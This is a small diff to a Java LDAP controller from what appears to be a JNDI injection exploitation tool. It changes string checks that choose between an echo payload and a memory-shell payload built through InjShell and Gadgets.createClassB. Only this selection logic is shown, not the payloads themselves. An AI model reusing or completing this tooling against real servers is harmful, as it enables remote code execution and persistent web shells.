@@ -44,13 +44,13 @@ public class BasicController implements LdapController {
             Entry     e         = new Entry(base);
             String    className = "";
 
-            if (payloadType.indexOf("E-") != -1) {
+            if (payloadType.contains("E-")) {
                 String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
                 final Class EchoClass = Class.forName(ClassNameHandler.searchClassByName(ClassName1));
                 className = EchoClass.getName();
             }
 
-            if (payloadType.indexOf("M-") != -1) {
+            if (payloadType.contains("M-")) {
                 String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
                 InjShell.init(params);
                 className = Gadgets.createClassB(ClassName1);
